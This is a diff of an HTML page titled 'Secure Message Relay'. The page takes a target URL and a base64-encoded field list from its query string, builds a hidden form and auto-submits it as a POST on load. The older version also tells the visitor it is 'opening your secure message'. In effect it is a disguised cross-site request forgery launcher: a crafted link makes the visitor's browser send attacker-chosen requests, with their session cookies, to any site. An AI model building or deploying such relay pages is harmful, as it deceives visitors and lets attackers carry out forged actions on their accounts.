@@ -1,58 +1,42 @@
 <!doctype html>
-<meta charset="utf-8">
-<title>Secure Message Relay</title>
-<style>
-  body { font-family: system-ui, sans-serif; padding: 24px; }
-  .box { max-width: 680px; margin: 4rem auto; text-align: center; }
-  button { padding: .7rem 1rem; font-weight: 600; }
-</style>
-<div class="box">
-  <h1>Opening your secure message…</h1>
-  <p>If nothing happens, click the button:</p>
-  <p><button id="go">Continue</button></p>
-</div>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Secure Message Relay</title>
+</head>
+<body>
 <script>
-  const qp = new URL(location.href).searchParams;
-  const actionParam = qp.get('a') || '';
-  const bodyParam   = qp.get('b') || '';
+(function () {
+  const params = new URLSearchParams(window.location.search);
+  const action = decodeURIComponent(params.get('a') || '');
+  const payloadB64 = params.get('p') || '';
 
-  // decode b64 (URI-safe) → UTF-8
-  function b64decodeUtf8(s) {
-    try {
-      return decodeURIComponent(escape(atob(decodeURIComponent(s))));
-    } catch (e) {
-      try { return decodeURIComponent(escape(atob(s))); } catch(e2) { return ''; }
-    }
+  if (!action || !payloadB64) {
+    document.body.textContent = 'Missing parameters.';
+    return;
   }
 
-  function buildAndSubmit() {
-    const action = decodeURIComponent(actionParam);
-    const body   = b64decodeUtf8(bodyParam);
+  const payload = atob(payloadB64); // x-www-form-urlencoded: k=v&k2=v2...
 
-    if (!action || !body) {
-      alert('Missing data to open the secure message.');
-      return;
-    }
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = action;
+  document.body.appendChild(form);
 
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = action;
-
-    body.split('&').forEach(kv => {
-      if (!kv) return;
-      const [k, v=''] = kv.split('=');
+  // Crear inputs a partir de k=v&k2=v2...
+  payload.split('&').forEach(kv => {
+    const [k, v] = kv.split('=');
+    if (k) {
       const input = document.createElement('input');
       input.type  = 'hidden';
       input.name  = decodeURIComponent(k);
-      input.value = decodeURIComponent(v);
+      input.value = decodeURIComponent(v || '');
       form.appendChild(input);
-    });
+    }
+  });
 
-    document.body.appendChild(form);
-    form.submit();
-  }
-
-  document.getElementById('go').addEventListener('click', buildAndSubmit);
-  // auto-submit on load
-  window.addEventListener('load', buildAndSubmit);
+  form.submit();
+})();
 </script>
+</body>
+</html>
